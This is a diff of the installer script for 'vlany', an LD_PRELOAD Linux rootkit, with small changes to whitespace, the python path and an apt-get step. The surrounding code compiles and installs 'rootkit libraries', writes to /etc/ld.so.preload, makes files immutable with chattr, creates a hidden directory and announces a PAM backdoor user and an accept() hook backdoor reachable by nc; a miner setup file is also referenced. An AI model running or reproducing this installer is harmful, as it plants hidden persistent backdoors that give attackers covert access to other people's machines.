@@ -168,7 +168,7 @@ get_vlany_settings ()
         ENV_VAR="$(cat /dev/urandom | tr -dc 'A-Z' | fold -w 12 | head -n 1)"
         ENV_VAR=$(dialog --title "$TITLE" --inputbox "\nEnvironment variable" 9 50 "$ENV_VAR" 3>&1 1>&2 2>&3)
     fi
-    
+
     HIDDEN_XATTR_1_STR="$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 32 | head -n 1)"
     HIDDEN_XATTR_2_STR="$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 32 | head -n 1)"
     LIB_LOCATION="${INSTALL}/${OBJECT_FILE_NAME}.so.\$PLATFORM"
@@ -247,13 +247,13 @@ setup_vlany ()
     chattr +ia $INSTALL/.profile $INSTALL/.bashrc $INSTALL/.shell_msg $INSTALL/.vlany_information $INSTALL/${OBJECT_FILE_NAME}* /etc/ld.so.preload
 }
 
-PYTHON_BIN="/usr/bin/python2"
+PYTHON_BIN=`which python`
 
 echo "Installing python(2)"
 if [ -f /usr/bin/yum ]; then
     yes | yum install python2 &>/dev/null
 elif [ -f /usr/bin/apt-get ]; then
-    yes | apt-get update &>/dev/null
+    yes | apt-get update &>/dev/null && sleep 1
     apt-get --yes --force-yes install python &>/dev/null
 elif [ -f /usr/bin/pacman ]; then
     pacman -Syy &>/dev/null
@@ -277,7 +277,7 @@ if [ "$1" == "--cli" ]; then
         echo "Invalid option. Exiting."
         exit
     fi
-    
+
     echo "Installing prerequisite packages... Please wait."
     install_vlany_prerequisites
     echo "Packages installed."
@@ -286,30 +286,30 @@ if [ "$1" == "--cli" ]; then
 
     INSTALLING_IN_CLI=1
     get_vlany_settings
-    
+
     config_vlany
-    
+
     echo "Compiling rootkit libraries."
     sleep 2
     compile_vlany
     echo "Rootkit libraries compiled."
     sleep 2
-    
+
     [ $STATUS == "compile" ] && { rm -rf *.o bashrc shell_msg bd_readme minerd_setup.py; exit; }
-    
+
     echo "Installing vlany."
     sleep 1
     install_vlany
     echo "Installed."
     sleep 1
-    
+
     echo "Setting up hidden directory and protecting files."
     sleep 1
-    
+
     setup_vlany
-    
+
     [ -f "/etc/init.d/ssh" ] && { /etc/init.d/ssh restart &>/dev/null; }
-    
+
     echo "The installation process has finished. You can now SSH into your PAM backdoor user, or you can use nc (or something better) to connect to your accept() hook backdoor."
     read -p "Would you like to automatically remove this directory (`pwd`) on exit? (YES/NO) (case-sensitive) [YES]: "
     if [ -z $REPLY ]; then
